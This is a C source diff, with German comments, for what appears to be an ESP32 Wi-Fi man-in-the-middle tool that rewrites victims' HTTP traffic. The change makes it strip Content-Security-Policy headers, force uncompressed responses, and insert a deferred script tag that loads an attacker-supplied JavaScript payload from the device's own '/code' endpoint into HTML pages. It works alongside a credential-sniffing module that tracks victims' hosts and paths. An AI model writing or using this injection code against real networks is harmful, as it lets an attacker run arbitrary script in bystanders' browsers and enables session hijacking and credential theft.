@@ -3,6 +3,7 @@
 
 #include <esp_log.h>
 #include <stdio.h>
+#include <stddef.h>
 #include <string.h>
 
 #define TAG "WlanHtmlInject"
@@ -11,8 +12,23 @@
 #define ETHTYPE_IPV4 0x0800
 #define IPPROTO_TCP 6
 
-#define INJECT_CODE_MAX 256
-#define INJECT_DEFAULT "<script>alert(1234);</script>"
+#define INJECT_CODE_MAX 96
+// Loader-Template: protocol-relative URL, damit der Browser das Schema von der
+// gemitm-ten Seite übernimmt (http auf http-Pages; https-Pages scheitern eh,
+// weil wir kein TLS sprechen). Pro Paket wird %%MY_IP%% gerendert. Resultat
+// ist ~45 Bytes — passt fast überall in die <body>-Compaction.
+// `defer` ist kritisch: ohne wäre der Loader synchron — wenn /code aus
+// irgendeinem Grund stuck ist (TCP-Issue, Server-Hänger), blockiert der HTML-
+// Parser bis Timeout und der Browser zeigt nie was an. Mit defer rendert die
+// Page normal, das Script wird "best effort" geladen und ausgeführt sobald
+// das DOM steht.
+#define INJECT_LOADER "<script src=\"//%%MY_IP%%/code\" defer></script>"
+
+// Raw User-Payload — wird via wlan_html_inject_set_code gesetzt und beim
+// HTTP-GET /code an den Browser ausgeliefert. Darf %%MY_IP%% / %%VICTIM_IP%%
+// als Template-Variablen enthalten (vom mitm-server gerendert).
+#define USER_PAYLOAD_MAX 1024
+#define USER_PAYLOAD_DEFAULT "alert(1234);"
 
 // Length-preserving Replacement für outbound Accept-Encoding-Header:
 // "Accept-Encoding: identity" — Server antwortet dann unkomprimiert.
@@ -23,14 +39,42 @@ static volatile bool s_armed = false;
 static volatile uint32_t s_injected = 0;
 static volatile uint32_t s_stripped = 0;
 
-// Inject-Payload (dynamisch setzbar via wlan_html_inject_set_code).
-// Producer im lwIP-tcpip_thread liest s_inject_code_len (atomic acquire) und
-// dann s_inject_code[0..len) — der UI-Thread schreibt erst den Buffer, dann
-// release-stored die Länge. Innerhalb einer Run-Session wird der Code nie
-// geändert, daher reicht das ohne weitere Synchronisation.
-static char s_inject_code[INJECT_CODE_MAX] = INJECT_DEFAULT;
-static volatile uint32_t s_inject_code_len = sizeof(INJECT_DEFAULT) - 1;
+// Per-Flow Content-Type-Cache. Continuation-Pakete enthalten keinen
+// Content-Type-Header — wir müssen ihn beim Response-Start parsen und für
+// alle Folge-Pakete derselben TCP-Connection cachen. Schlüssel ist das volle
+// 4-Tuple, damit mehrere parallele Verbindungen zum selben Server (gleiche
+// sip+sport) sich nicht in die Quere kommen. Läuft single-threaded im L2-Hook,
+// daher keine Synchronisation nötig.
+#define FLOW_CACHE_SIZE 16
+#define FLOW_URL_MAX WLAN_CRED_STR_MAX
+typedef struct {
+    uint32_t sip;
+    uint16_t sport;
+    uint32_t dip;
+    uint16_t dport;
+    bool is_html;
+    bool valid;
+    uint32_t lru;
+    // URL beim Response-Start einmalig aus url_track geclaimt — bleibt für
+    // alle Continuation-Pakete dieser Response gültig. Verhindert, dass spätere
+    // Requests in derselben keep-alive Connection den Inject-Display vergiften.
+    char host[FLOW_URL_MAX];
+    char path[FLOW_URL_MAX];
+} FlowEntry;
+static FlowEntry s_flow_cache[FLOW_CACHE_SIZE];
+static uint32_t s_flow_lru_counter = 0;
+
+// Inject-Payload (Loader-Template, fest). Producer im lwIP-tcpip_thread liest
+// s_inject_code_len (atomic acquire) und dann s_inject_code[0..len) — der
+// UI-Thread schreibt erst den Buffer, dann release-stored die Länge.
+static char s_inject_code[INJECT_CODE_MAX] = INJECT_LOADER;
+static volatile uint32_t s_inject_code_len = sizeof(INJECT_LOADER) - 1;
 static volatile uint32_t s_my_ip = 0;
+
+// Raw User-Payload für /code-Endpoint. Atomic-store auf len gibt den Buffer
+// frei; HTTP-Handler im mitm-server liest mit acquire.
+static char s_user_payload[USER_PAYLOAD_MAX] = USER_PAYLOAD_DEFAULT;
+static volatile uint32_t s_user_payload_len = sizeof(USER_PAYLOAD_DEFAULT) - 1;
 
 // Render-Scratch — wird im lwIP-tcpip_thread genutzt (single producer),
 // daher kein Lock. Vor jedem Inject wird das Template hier aufgelöst.
@@ -44,6 +88,11 @@ void wlan_html_inject_set_armed(bool armed) {
     if(armed) {
         __atomic_store_n(&s_injected, 0u, __ATOMIC_RELAXED);
         __atomic_store_n(&s_stripped, 0u, __ATOMIC_RELAXED);
+        // Stale Per-Flow-Einträge aus voriger Session wegwerfen — sonst
+        // bringt ein wiederverwendeter (sip,sport,dip,dport)-Tuple alte
+        // is_html/URL-Werte zurück und vergiftet neue Connections.
+        memset(s_flow_cache, 0, sizeof(s_flow_cache));
+        s_flow_lru_counter = 0;
     }
 }
 
@@ -53,11 +102,21 @@ bool wlan_html_inject_armed(void) {
 
 void wlan_html_inject_set_code(const char* code) {
     if(!code) return;
-    uint32_t l = (uint32_t)strlen(code);
-    if(l == 0) return;
-    if(l > INJECT_CODE_MAX) l = INJECT_CODE_MAX;
-    memcpy(s_inject_code, code, l);
-    __atomic_store_n(&s_inject_code_len, l, __ATOMIC_RELEASE);
+    uint32_t code_l = (uint32_t)strlen(code);
+    if(code_l == 0) return;
+    if(code_l >= USER_PAYLOAD_MAX) code_l = USER_PAYLOAD_MAX - 1;
+    memcpy(s_user_payload, code, code_l);
+    s_user_payload[code_l] = '\0';
+    __atomic_store_n(&s_user_payload_len, code_l, __ATOMIC_RELEASE);
+    // s_inject_code bleibt der Loader — kein Re-Wrap nötig.
+}
+
+uint32_t wlan_html_inject_get_payload(char* out, uint32_t max_len) {
+    if(!out || max_len == 0) return 0;
+    uint32_t l = __atomic_load_n(&s_user_payload_len, __ATOMIC_ACQUIRE);
+    if(l > max_len) l = max_len;
+    memcpy(out, s_user_payload, l);
+    return l;
 }
 
 void wlan_html_inject_set_cred_sniff(struct WlanCredSniff* cs) {
@@ -321,102 +380,283 @@ static int render_template(
 }
 
 // ---------------------------------------------------------------------------
-// Length-preserving Fallback: ersten <meta...>-Tag (mit ausreichend
-// umliegendem Whitespace) durch INJECT_SCRIPT + Space-Padding ersetzen.
-// Funktioniert auch in Folge-Paketen einer multi-segment-Response, weil sich
-// die TCP-Payload-Länge nicht ändert. Iteriert über alle <meta>-Tags bis
-// einer mit Span >= INJECT_SCRIPT_LEN gefunden wird.
+// Per-Flow Content-Type-Cache
 // ---------------------------------------------------------------------------
 
-// Sucht nach den ersten <meta>-Tag und ersetzt ihn length-preserving durch
-// den Inject-Code. Wenn der Span (Tag + direkt umliegende Whitespaces) zu
-// klein ist, wird gierig Whitespace aus nachfolgenden ">\s+<"-Lücken
-// "gestohlen": der HTML-Inhalt zwischen dem Span und der Whitespace-Lücke
-// wird per memmove nach rechts geschoben, die führenden Whitespace-Bytes der
-// Lücke überschrieben. Effektiv: <meta> + folgender Tag rücken zusammen,
-// dazwischen wird Platz frei. Browser sehen am Ende dasselbe HTML mit
-// weniger Whitespace zwischen einigen Tags — semantisch egal.
-static bool replace_meta_with_script(
-    uint8_t* data, int data_len, const char* code, int icl) {
-    if(icl <= 0) return false;
+static FlowEntry* flow_cache_find(uint32_t sip, uint16_t sport, uint32_t dip, uint16_t dport) {
+    for(int i = 0; i < FLOW_CACHE_SIZE; i++) {
+        FlowEntry* f = &s_flow_cache[i];
+        if(f->valid && f->sip == sip && f->sport == sport &&
+           f->dip == dip && f->dport == dport) {
+            return f;
+        }
+    }
+    return NULL;
+}
 
-    int from = 0;
-    while(from < data_len) {
-        const uint8_t* tag = ci_mem_find(data + from, data_len - from, "<meta");
-        if(!tag) return false;
-        int tag_off = (int)(tag - data);
-        int close = -1;
-        for(int i = tag_off + 5; i < data_len; i++) {
-            if(data[i] == '>') {
-                close = i;
+static FlowEntry* flow_cache_get(
+    uint32_t sip, uint16_t sport, uint32_t dip, uint16_t dport) {
+    FlowEntry* f = flow_cache_find(sip, sport, dip, dport);
+    if(!f) return NULL;
+    f->lru = ++s_flow_lru_counter;
+    return f;
+}
+
+static FlowEntry* flow_cache_set(
+    uint32_t sip, uint16_t sport, uint32_t dip, uint16_t dport,
+    bool is_html, const char* host, const char* path) {
+    FlowEntry* f = flow_cache_find(sip, sport, dip, dport);
+    if(!f) {
+        int target = 0;
+        uint32_t oldest = UINT32_MAX;
+        for(int i = 0; i < FLOW_CACHE_SIZE; i++) {
+            if(!s_flow_cache[i].valid) {
+                target = i;
                 break;
             }
-            if(data[i] == '<') break;
+            if(s_flow_cache[i].lru < oldest) {
+                oldest = s_flow_cache[i].lru;
+                target = i;
+            }
         }
-        if(close < 0) {
-            from = tag_off + 5;
+        f = &s_flow_cache[target];
+        f->sip = sip;
+        f->sport = sport;
+        f->dip = dip;
+        f->dport = dport;
+        f->valid = true;
+    }
+    f->is_html = is_html;
+    if(host) {
+        size_t n = strlen(host);
+        if(n >= sizeof(f->host)) n = sizeof(f->host) - 1;
+        memcpy(f->host, host, n);
+        f->host[n] = '\0';
+    } else {
+        f->host[0] = '\0';
+    }
+    if(path) {
+        size_t n = strlen(path);
+        if(n >= sizeof(f->path)) n = sizeof(f->path) - 1;
+        memcpy(f->path, path, n);
+        f->path[n] = '\0';
+    } else {
+        f->path[0] = '\0';
+    }
+    f->lru = ++s_flow_lru_counter;
+    return f;
+}
+
+// Content-Type Response-Header parsen. Nur "text/html" und
+// "application/xhtml+xml" gelten als injectable. Kein Content-Type → false
+// (conservative — wenn der Server ihn nicht setzt, raten wir nicht).
+static bool is_html_content_type(const uint8_t* data, int header_block_len) {
+    const uint8_t* ct = ci_mem_find(data, header_block_len, "Content-Type:");
+    if(!ct) return false;
+    int off = (int)(ct - data) + 13; // strlen("Content-Type:")
+    while(off < header_block_len && (data[off] == ' ' || data[off] == '\t')) off++;
+    int rem = header_block_len - off;
+    if(rem >= 9 && ci_match(data + off, "text/html", 9)) return true;
+    if(rem >= 21 && ci_match(data + off, "application/xhtml+xml", 21)) return true;
+    return false;
+}
+
+// HTTP-Statuscode aus "HTTP/1.1 NNN ..." extrahieren. 0 wenn unparsbar.
+static int parse_http_status(const uint8_t* data, int data_len) {
+    if(data_len < 12) return 0;
+    int sp = -1;
+    for(int i = 5; i < 16 && i < data_len; i++) {
+        if(data[i] == ' ') {
+            sp = i;
+            break;
+        }
+    }
+    if(sp < 0) return 0;
+    int status = 0;
+    int digits = 0;
+    for(int i = sp + 1; i < data_len && digits < 4; i++) {
+        if(data[i] < '0' || data[i] > '9') break;
+        status = status * 10 + (data[i] - '0');
+        digits++;
+    }
+    return digits == 3 ? status : 0;
+}
+
+// ---------------------------------------------------------------------------
+// Length-preserving Fallback per HTML-Compaction:
+//   1. <noscript>...</noscript>-Blöcke wegnehmen (im JS-Pfad eh tot).
+//   2. <!-- ... --> HTML-Comments wegnehmen.
+//   3. Whitespace direkt nach '>' wegnehmen (semantisch leer im HTML-Flow).
+//   4. Mehrfaches Whitespace (Space/Tab/Newline) → ein einzelnes Space —
+//      gilt überall, also auch in inline <script>/<style>. JS und CSS sind
+//      whitespace-insensitiv, allerdings ändert das Whitespace innerhalb von
+//      String-Literals ("Hello   World" → "Hello World"). Akzeptables Risiko.
+//      <pre>/<textarea>-Inhalte würden hier unsauber werden — selten genug.
+//   5. Den kompakten HTML-Block per memmove um icl Bytes nach rechts schieben.
+//   6. Den Script-Code in den entstandenen Lead-Raum schreiben; den Rest hinten
+//      mit Spaces auffüllen — Paket bleibt exakt gleich lang.
+//
+// Das funktioniert sowohl im Response-Start-Paket (wenn growth-Inject am
+// <body> nicht möglich war) als auch in Continuation-Paketen ohne <body>.
+// Bei Response-Start beginnen wir die Compaction NACH dem Header-Block, sonst
+// am Anfang der TCP-Payload.
+// ---------------------------------------------------------------------------
+
+// Case-insensitive Tag-Anker-Check: passt "<noscript" mit folgendem Whitespace,
+// '/' oder '>'? Muss ausschließen, dass wir innerhalb eines anderen Tags
+// landen ("<noscriptly" oder so).
+static bool is_noscript_open(const uint8_t* p, int avail) {
+    if(avail < 10) return false;
+    if(!ci_match(p, "<noscript", 9)) return false;
+    uint8_t c = p[9];
+    return c == '>' || c == ' ' || c == '\t' || c == '\n' || c == '\r' || c == '/';
+}
+
+static bool is_comment_open(const uint8_t* p, int avail) {
+    return avail >= 4 && p[0] == '<' && p[1] == '!' && p[2] == '-' && p[3] == '-';
+}
+
+// Versucht an Position p einen "skippable block" zu erkennen: <noscript>...
+// </noscript> oder <!-- ... -->. Liefert die Block-Länge (>= 0), oder -1 wenn
+// kein solcher Block am Anker steht / das schliessende Tag im Paket fehlt.
+static int skippable_block_len(const uint8_t* p, int avail) {
+    if(avail < 4 || p[0] != '<') return -1;
+    if(is_noscript_open(p, avail)) {
+        const uint8_t* close = ci_mem_find(p, avail, "</noscript>");
+        if(close) return (int)(close - p) + 11; // strlen("</noscript>")
+        return -1;
+    }
+    if(is_comment_open(p, avail)) {
+        const uint8_t* close = ci_mem_find(p, avail, "-->");
+        if(close) return (int)(close - p) + 3;
+        return -1;
+    }
+    return -1;
+}
+
+// Dry-Run: zählt, wie viele Bytes die Compaction sparen würde — keine Mutation.
+static int compact_savings(const uint8_t* data, int data_len) {
+    int r = 0;
+    int saved = 0;
+    bool prev_was_gt = false;
+    bool prev_was_ws = false;
+    while(r < data_len) {
+        int block = skippable_block_len(data + r, data_len - r);
+        if(block > 0) {
+            saved += block;
+            r += block;
+            prev_was_gt = true; // sowohl </noscript> als auch --> enden auf '>'
+            prev_was_ws = false;
             continue;
         }
-
-        // Phase 1: Span = <meta...> mit direkt umliegenden Whitespaces.
-        int span_start = tag_off;
-        int span_end = close + 1;
-        while(span_start > 0 && is_html_ws(data[span_start - 1]) &&
-              (span_end - span_start) < icl) {
-            span_start--;
+        bool ws = is_html_ws(data[r]);
+        if(ws && (prev_was_gt || prev_was_ws)) {
+            saved++;
+            r++;
+            continue;
         }
-        while(span_end < data_len && is_html_ws(data[span_end]) &&
-              (span_end - span_start) < icl) {
-            span_end++;
-        }
-
-        // Phase 2: noch zu wenig — fresse Whitespaces aus nachfolgenden
-        // ">\s+<"-Lücken im selben Paket, indem der Inhalt dazwischen per
-        // memmove nach rechts geschoben wird. safety verhindert Endlos-Loops
-        // bei pathologischem HTML.
-        int safety = 32;
-        while((span_end - span_start) < icl && safety-- > 0) {
-            // Nächstes '>' (Ende des nächsten Tags) suchen.
-            int gt_pos = -1;
-            for(int i = span_end; i < data_len; i++) {
-                if(data[i] == '>') {
-                    gt_pos = i;
-                    break;
-                }
-            }
-            if(gt_pos < 0) break;
-
-            // Whitespace-Region direkt nach '>' bis vor das nächste '<'.
-            int ws_start = gt_pos + 1;
-            int ws_end = ws_start;
-            while(ws_end < data_len && is_html_ws(data[ws_end])) ws_end++;
-            // Muss von '<' beendet sein (sonst ist's Text-Content, den wir
-            // nicht mitten in einem Wort kürzen wollen).
-            if(ws_end >= data_len || data[ws_end] != '<') break;
-            int ws_len = ws_end - ws_start;
-            if(ws_len == 0) break; // direkt aneinandergrenzende Tags — kein Whitespace zu holen
-
-            int needed = icl - (span_end - span_start);
-            int take = (ws_len < needed) ? ws_len : needed;
-
-            // Verschiebe Inhalt zwischen span_end und ws_start nach rechts um
-            // `take` Bytes. Die ersten `take` Bytes der Whitespace-Region
-            // werden dadurch überschrieben — genau das wollen wir. Die
-            // [span_end .. span_end+take) Bytes sind danach "frei" und
-            // werden gleich mit Script-Inhalt überschrieben.
-            int between_len = ws_start - span_end;
-            memmove(data + span_end + take, data + span_end, (size_t)between_len);
-            span_end += take;
-        }
-
-        if((span_end - span_start) >= icl) {
-            memcpy(data + span_start, code, (size_t)icl);
-            for(int i = span_start + icl; i < span_end; i++) data[i] = ' ';
-            return true;
-        }
-        from = close + 1;
+        prev_was_gt = (data[r] == '>');
+        prev_was_ws = ws;
+        r++;
     }
-    return false;
+    return saved;
+}
+
+// In-place Compaction. Schreibt das kompakte HTML nach data[0..ret) und liefert
+// die neue Länge. Bytes hinter ret sind "frei" (enthalten Lese-Reste).
+static int compact_inplace(uint8_t* data, int data_len) {
+    int w = 0, r = 0;
+    bool prev_was_gt = false;
+    bool prev_was_ws = false;
+    while(r < data_len) {
+        int block = skippable_block_len(data + r, data_len - r);
+        if(block > 0) {
+            r += block;
+            prev_was_gt = true;
+            prev_was_ws = false;
+            continue;
+        }
+        bool ws = is_html_ws(data[r]);
+        if(ws && (prev_was_gt || prev_was_ws)) {
+            r++;
+            continue;
+        }
+        // Tab/Newline werden zu Space normalisiert, damit die Sequenz "WS+WS"
+        // Detection in nachfolgenden Iterationen einheitlich greift und das
+        // sichtbare Resultat sauber bleibt (Browser sieht eh Whitespace).
+        data[w] = ws ? ' ' : data[r];
+        prev_was_gt = (data[r] == '>');
+        prev_was_ws = ws;
+        w++;
+        r++;
+    }
+    return w;
+}
+
+// Sucht im HTML-Fragment den ersten verwendbaren Inject-Anker: <head...>
+// (bevorzugt — Loader läuft so vor jedem dynamischen body-Reset) oder
+// <body...> als Fallback. Liefert Position direkt nach dem '>' des Tags, oder
+// -1 wenn kein vollständiger Anker im Paket steckt. Schließt False-Positives
+// wie <header> aus, indem nach "<head"/"<body" auf erlaubtes Folgezeichen
+// (Whitespace, '/', '>') geprüft wird.
+static int find_inject_anchor(const uint8_t* data, int data_len) {
+    static const struct { const char* name; int len; } anchors[] = {
+        {"<head", 5},
+        {"<body", 5},
+    };
+    for(unsigned t = 0; t < sizeof(anchors) / sizeof(anchors[0]); t++) {
+        int from = 0;
+        while(from < data_len) {
+            const uint8_t* tag =
+                ci_mem_find(data + from, data_len - from, anchors[t].name);
+            if(!tag) break;
+            int tag_off = (int)(tag - data);
+            int after = tag_off + anchors[t].len;
+            if(after >= data_len) break;
+            uint8_t c = data[after];
+            bool valid_boundary =
+                c == '>' || c == ' ' || c == '\t' ||
+                c == '\n' || c == '\r' || c == '/';
+            if(valid_boundary) {
+                for(int i = after; i < data_len; i++) {
+                    if(data[i] == '>') return i + 1;
+                    if(data[i] == '<') return -1; // Tag halb im Paket
+                }
+                return -1;
+            }
+            from = after; // war false-positive (z.B. <header>) — weiter suchen
+        }
+    }
+    return -1;
+}
+
+// Compaction-basierter Inject. data[0..region_len) ist der Bereich, in dem
+// compactiert werden darf (in Response-Start: nach Header-Block; sonst
+// gesamte Payload). Script landet direkt hinter <head...> (oder <body...>
+// als Fallback). Wenn kein Anker da ist (Continuation-Paket nach dem
+// Head/Body-Tag), Inject hier skippen.
+// Returns true bei Erfolg (Daten wurden modifiziert).
+static bool inject_via_compaction(uint8_t* data, int region_len, const char* code, int icl) {
+    if(icl <= 0 || icl > region_len) return false;
+
+    // Vor-Check: Anker im Original. Compaction verschiebt den Tag nicht aus
+    // dem Paket raus, also ist er nach Compaction garantiert noch da. So
+    // vermeiden wir, dass compact_inplace die Daten destruktiv modifiziert
+    // obwohl wir am Ende eh nicht injecten würden.
+    if(find_inject_anchor(data, region_len) < 0) return false;
+    if(compact_savings(data, region_len) < icl) return false;
+
+    int new_len = compact_inplace(data, region_len);
+    int inject_pos = find_inject_anchor(data, new_len);
+    if(inject_pos < 0) return false; // sollte nicht passieren
+
+    // [inject_pos..new_len) nach rechts schieben, Script reinkopieren, Rest
+    // mit Spaces auffüllen.
+    int tail_len = new_len - inject_pos;
+    memmove(data + inject_pos + icl, data + inject_pos, (size_t)tail_len);
+    memcpy(data + inject_pos, code, (size_t)icl);
+    for(int i = inject_pos + icl + tail_len; i < region_len; i++) data[i] = ' ';
+    return true;
 }
 
 // ---------------------------------------------------------------------------
@@ -427,7 +667,10 @@ static bool replace_meta_with_script(
 
 // data muss ein HTTP-Response-Start-Paket sein (Payload beginnt mit "HTTP/").
 // Caller stellt das sicher, daher kein redundanter Check.
-static int inject_into_body(
+// Inject landet hinter <head...> (bevorzugt) oder <body...> (Fallback) —
+// head-platziert, weil JS auf der Page später document.body.innerHTML setzen
+// und unseren Loader killen könnte.
+static int inject_after_anchor(
     uint8_t* data, int data_len, int max_growth, const char* code, int icl) {
     if(icl <= 0) return 0;
     if(max_growth < icl) return 0;
@@ -442,23 +685,11 @@ static int inject_into_body(
     int cl_off, cl_field_len;
     uint32_t cl_value;
     if(!find_content_length(data, header_block_len, &cl_off, &cl_field_len, &cl_value)) return 0;
-    if(cl_value > (uint32_t)body_avail) return 0; // multi-segment → meta-replace fallback
+    if(cl_value > (uint32_t)body_avail) return 0; // multi-segment → compaction fallback
 
-    const uint8_t* body_tag = ci_mem_find(data + body_off, body_avail, "<body");
-    if(!body_tag) return 0;
-    int btag_off = (int)(body_tag - data);
-    int max_search = btag_off + 256;
-    if(max_search > data_len) max_search = data_len;
-    int btag_close = -1;
-    for(int i = btag_off + 5; i < max_search; i++) {
-        if(data[i] == '>') {
-            btag_close = i;
-            break;
-        }
-        if(data[i] == '<') return 0;
-    }
-    if(btag_close < 0) return 0;
-    int inject_pos = btag_close + 1;
+    int anchor_in_html = find_inject_anchor(data + body_off, body_avail);
+    if(anchor_in_html < 0) return 0;
+    int inject_pos = body_off + anchor_in_html;
 
     if(!write_content_length(data, cl_off, cl_field_len, cl_value + (uint32_t)icl)) return 0;
 
@@ -515,18 +746,52 @@ bool wlan_html_inject_process_eth(uint8_t* eth, uint16_t* len_ptr, uint16_t buf_
             modified = true;
         }
     } else if(from_server) {
-        // Template rendern: Inject-Code mit %%MY_IP%%, %%VICTIM_IP%%, %%HOST%%,
-        // %%PATH%% vorbereiten. Lookup im Cred-Sniff-Tracker für Host/Path.
         uint32_t src_ip, dst_ip;
         memcpy(&src_ip, ip + 12, 4);
         memcpy(&dst_ip, ip + 16, 4);
-        char host_buf[WLAN_CRED_STR_MAX] = {0};
-        char path_buf[WLAN_CRED_STR_MAX] = {0};
-        if(s_cred_sniff) {
-            wlan_cred_sniff_lookup_http_url(
-                s_cred_sniff, src_ip, dport,
-                host_buf, sizeof(host_buf), path_buf, sizeof(path_buf));
+
+        bool is_response_start = (data_len >= 5 && memcmp(data, "HTTP/", 5) == 0);
+
+        // Per-Flow Content-Type- und URL-Tracking: bei Response-Start Header
+        // parsen und URL aus url_track claimen, bei Continuation aus Cache
+        // lesen. Wenn der Stream nicht HTML ist (.js, .css, Bilder) → komplett
+        // skippen, sonst injecten wir Müll in JavaScript-Files o.ä.
+        FlowEntry* flow;
+        if(is_response_start) {
+            const uint8_t* hdr_end = ci_mem_find(data, data_len, "\r\n\r\n");
+            int hdr_len = hdr_end ? (int)(hdr_end - data) : data_len;
+            int status = parse_http_status(data, data_len);
+            // Nur erfolgreiche Responses (2xx) injecten. 3xx-Redirects haben
+            // keinen Body; 4xx/5xx-Error-Pages sind oft text/html (z.B. 404
+            // für .css.map vom DevTools), aber Browser zeigen sie selten an —
+            // Inject darin ist verschwendete Mühe und macht den INJ-Display
+            // verwirrend.
+            bool ok_status = (status >= 200 && status < 300);
+            bool is_html = ok_status && is_html_content_type(data, hdr_len);
+            char host_buf[WLAN_CRED_STR_MAX] = {0};
+            char path_buf[WLAN_CRED_STR_MAX] = {0};
+            if(is_html && s_cred_sniff) {
+                // url_track bei Response-Start einfrieren — danach kann ein
+                // pipelined Folge-Request den Slot überschreiben, wir nutzen
+                // aber ab jetzt nur noch unsere Kopie.
+                wlan_cred_sniff_lookup_http_url(
+                    s_cred_sniff, src_ip, dport,
+                    host_buf, sizeof(host_buf), path_buf, sizeof(path_buf));
+            }
+            flow = flow_cache_set(src_ip, sport, dst_ip, dport, is_html, host_buf, path_buf);
+        } else {
+            // Unbekannter Flow (Cache-Eviction, Stream-Boot mid-connection):
+            // conservative skip statt blind injecten.
+            flow = flow_cache_get(src_ip, sport, dst_ip, dport);
+            if(!flow) return false;
         }
+        if(!flow->is_html) return false;
+
+        // Template rendern aus per-Flow gecachtem Host/Path. NICHT direkt aus
+        // url_track lesen — der zeigt bei keep-alive auf den letzten Request,
+        // nicht auf den, zu dem die aktuelle Response gehört.
+        const char* host_buf = flow->host;
+        const char* path_buf = flow->path;
         uint32_t tmpl_len = __atomic_load_n(&s_inject_code_len, __ATOMIC_ACQUIRE);
         int rendered_len = 0;
         if(tmpl_len > 0) {
@@ -537,41 +802,59 @@ bool wlan_html_inject_process_eth(uint8_t* eth, uint16_t* len_ptr, uint16_t buf_
         }
 
         bool injected_now = false;
-        // CSP-Strip + body-Inject sind nur auf dem Response-Start-Paket
-        // sinnvoll. Folge-Pakete enthalten weder Header noch <body>.
-        bool is_response_start = (data_len >= 5 && memcmp(data, "HTTP/", 5) == 0);
+        const char* via = NULL;
+
+        // CSP-Strip + growth-Inject am <head>-Anker sind nur auf Response-Start
+        // Paketen sinnvoll. Folge-Pakete enthalten weder Header noch Anker-Tag.
         if(is_response_start) {
             if(strip_csp(data, data_len)) {
                 __atomic_fetch_add(&s_stripped, 1u, __ATOMIC_RELAXED);
                 modified = true;
             }
             int headroom = (int)buf_size - (int)len;
-            int g = inject_into_body(data, data_len, headroom, s_rendered, rendered_len);
+            int g = inject_after_anchor(data, data_len, headroom, s_rendered, rendered_len);
             if(g > 0) {
                 growth = g;
                 data_len += g;
-                uint32_t n = __atomic_add_fetch(&s_injected, 1u, __ATOMIC_RELAXED);
-                if((n & 0x1f) == 1) // jeden 32. loggen
-                    ESP_LOGI(TAG, "INJECT #%lu (+%dB len=%u)",
-                        (unsigned long)n, g, (unsigned)(len + g));
                 modified = true;
                 injected_now = true;
+                via = "growth";
             }
         }
-        // Meta-Replace-Fallback (length-preserving). memchr-Vorprüfung spart
-        // den teuren ci_mem_find auf Paketen ohne '<' (z.B. Binär-Streams,
-        // Bilder, JS-Files ohne HTML).
-        if(growth == 0 && rendered_len > 0 && memchr(data, '<', (size_t)data_len) != NULL) {
-            if(replace_meta_with_script(data, data_len, s_rendered, rendered_len)) {
-                uint32_t n = __atomic_add_fetch(&s_injected, 1u, __ATOMIC_RELAXED);
-                if((n & 0x1f) == 1)
-                    ESP_LOGI(TAG, "META-REPLACE #%lu (dlen=%d)", (unsigned long)n, data_len);
-                modified = true;
-                injected_now = true;
+
+        // Compaction-Fallback (length-preserving). Continuation-Pakete ohne
+        // Anker silent skippen — das ist normal und braucht keinen Log.
+        if(!injected_now && rendered_len > 0 &&
+           memchr(data, '<', (size_t)data_len) != NULL) {
+            uint8_t* region = data;
+            int region_len = data_len;
+            if(is_response_start) {
+                const uint8_t* hdr_end = ci_mem_find(data, data_len, "\r\n\r\n");
+                if(hdr_end) {
+                    int hdr_len = (int)(hdr_end - data) + 4;
+                    region = data + hdr_len;
+                    region_len = data_len - hdr_len;
+                } else {
+                    region_len = 0;
+                }
+            }
+            if(region_len > 0 && find_inject_anchor(region, region_len) >= 0) {
+                if(compact_savings(region, region_len) >= rendered_len &&
+                   inject_via_compaction(region, region_len, s_rendered, rendered_len)) {
+                    modified = true;
+                    injected_now = true;
+                    via = "compact";
+                }
             }
         }
-        if(injected_now && s_cred_sniff) {
-            wlan_cred_sniff_push_inject(s_cred_sniff, src_ip, dst_ip, dport);
+
+        if(injected_now) {
+            __atomic_fetch_add(&s_injected, 1u, __ATOMIC_RELAXED);
+            (void)via;
+            if(s_cred_sniff) {
+                wlan_cred_sniff_push_inject(
+                    s_cred_sniff, src_ip, dst_ip, dport, flow->host, flow->path);
+            }
         }
     }
 
